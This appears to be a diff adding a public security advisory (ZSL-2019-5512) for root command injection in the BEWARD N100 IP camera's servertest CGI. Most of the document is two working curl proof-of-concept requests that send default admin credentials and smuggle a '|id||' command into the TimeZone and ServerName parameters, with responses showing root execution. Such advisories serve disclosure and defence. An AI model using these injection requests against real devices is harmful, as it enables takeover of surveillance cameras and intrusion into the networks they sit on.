@@ -1,0 +1,67 @@
+BEWARD N100 H.264 VGA IP Camera M2.1.6 Root Remote Code Execution
+
+
+Vendor: Beward R&D Co., Ltd
+Product web page: https://www.beward.net
+Affected version: M2.1.6.04C014
+
+Summary: The N100 compact color IP camera with support for a more efficient
+compression format is optimized for low-speed networks, thanks to which it
+transmits a real-time image over the network with minimal delays. The camera
+supports the switching of the broadcast modes, and in the event of a break in
+communication with the remote file storage, it can continue recording to the
+microSDHC memory card. N100 is easy to install and configure, has all the
+necessary arsenal for the organization of low-cost professional video surveillance
+systems.
+
+Desc: The camera suffers from two authenticated command injection vulnerabilities.
+The issues can be triggered when calling ServerName or TimeZone GET parameters
+via the servertest page. This can be exploited to inject arbitrary system commands
+and gain root remote code execution.
+
+Tested on: Boa/0.94.14rc21
+           Farady ARM Linux 2.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5512
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5512.php
+
+
+26.01.2019
+
+--
+
+---------------------------
+TimeZone command injection:
+
+root@ground:~# curl -X $'GET' -H $'Authorization: Basic YWRtaW46YWRtaW4=' $'http://TARGET/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org&TimeZone=03:00|id||'
+HTTP/1.1 200 OK
+Date: Sun, 01 Jan 2012 10:15:53 GMT
+Server: Boa/0.94.14rc21
+Accept-Ranges: bytes
+Connection: close
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+Content-type: text/plain
+
+ntp update
+0 OK
+
+
+-----------------------------
+ServerName command injection:
+
+root@ground:~# curl -X $'GET' -H $'Authorization: Basic YWRtaW46YWRtaW4=' $'http://TARGET/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||&TimeZone=03:00'
+HTTP/1.1 200 OK
+Date: Sun, 01 Jan 2012 10:22:11 GMT
+Server: Boa/0.94.14rc21
+Accept-Ranges: bytes
+Connection: close
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+Content-type: text/plain
+
+ntp update
+0 OK
